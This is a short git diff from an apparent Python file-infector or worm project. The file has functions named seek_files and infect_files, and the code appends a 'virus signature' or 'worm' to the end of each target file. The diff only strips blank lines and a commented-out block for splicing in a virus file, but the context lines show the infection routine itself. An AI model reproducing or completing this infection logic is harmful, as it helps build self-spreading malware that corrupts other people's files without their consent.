@@ -30,17 +30,8 @@ def seek_files(paths=DEFAULT_PATHS, file_signature=DEFAULT_FSIGNATURE, ftype=DEF
     return list(set(target_files))
 
 # infect the given files
-
-
 def infect_files(files_to_infect):
     virus_string = DEFAULT_VIRUS_SIGNATURE
-    # If you actually have a file you want to splice in
-    #virus = open()
-    #virus_string = ""
-    # for i, line in enumerate(virus):
-    #    virus_string += line
-    # virus.close()
-
     # Copy file contents and attach worm to end of file
     for filename in files_to_infect:
         f = open(filename)
